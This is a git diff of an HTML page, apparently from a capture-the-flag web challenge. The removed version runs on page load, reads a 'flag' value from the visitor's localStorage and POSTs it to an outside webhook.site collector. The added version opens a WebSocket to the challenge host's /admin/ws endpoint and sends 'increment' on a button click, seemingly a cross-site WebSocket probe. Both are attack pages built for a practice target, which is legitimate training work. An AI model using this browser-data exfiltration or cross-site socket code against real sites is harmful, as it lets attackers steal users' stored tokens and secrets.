@@ -3,57 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Flag or NoFlag</title>
+    <title>WebSocket Example</title>
+</head>
+<body>
+    <h1>WebSocket Test</h1>
+    <button id="sendMessageBtn">Send 'increment' message</button>
+
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            // Define the webhook URL
-            const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/flags';
+        // Initialize the WebSocket connection
+        const socket = new WebSocket('ws://ce441-web.spchallenge.ir:8080/admin/ws');
 
-            // Function to send the message to the webhook via POST request
-            const sendMessageToWebhook = (message) => {
-                console.log('Sending message:', message); // Log the message
+        // When the socket opens, log it and send the message
+        socket.onopen = function(event) {
+            console.log('WebSocket connection established');
+        };
 
-                // Make the POST request with the message
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json', // Send the request as JSON
-                    },
-                    body: JSON.stringify({ message: message }), // Send the message in the request body
-                })
-                .then(response => {
-                    // Check if the response is OK and log the result
-                    if (response.ok) {
-                        console.log('Message sent successfully');
-                        alert('Message sent successfully!');
-                    } else {
-                        console.error('Failed to send message. Status:', response.status);
-                        alert('Failed to send message.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error sending message:', error);
-                    alert('Error sending message.');
-                });
-            };
+        // Listen for messages from the server
+        socket.onmessage = function(event) {
+            console.log('Message from server: ', event.data);
+        };
 
-            // Check if the flag is stored in localStorage
-            const storedFlag = localStorage.getItem('flag');
-            console.log('Stored flag:', storedFlag);  // Log the stored flag value
+        // Handle socket close
+        socket.onclose = function(event) {
+            console.log('WebSocket connection closed');
+        };
 
-            // If a flag is stored, send it; otherwise, send 'noflag'
-            if (storedFlag) {
-                console.log('Flag found:', storedFlag);
-                sendMessageToWebhook(storedFlag); // Send the stored flag
+        // Handle socket errors
+        socket.onerror = function(error) {
+            console.log('WebSocket Error: ', error);
+        };
+
+        // Event listener for the button to send 'increment' message
+        document.getElementById('sendMessageBtn').addEventListener('click', function() {
+            if (socket.readyState === WebSocket.OPEN) {
+                socket.send('increment');
+                console.log('Message "increment" sent');
             } else {
-                console.log('No flag stored in localStorage.');
-                sendMessageToWebhook('noflag'); // Send 'noflag' if no flag is stored
+                console.log('WebSocket is not open');
             }
         });
     </script>
-</head>
-<body>
-    <h1>Send Flag or NoFlag</h1>
-    <p>If a flag is stored in localStorage, it will be sent to the specified webhook. If no flag is stored, "noflag" will be sent automatically.</p>
 </body>
 </html>
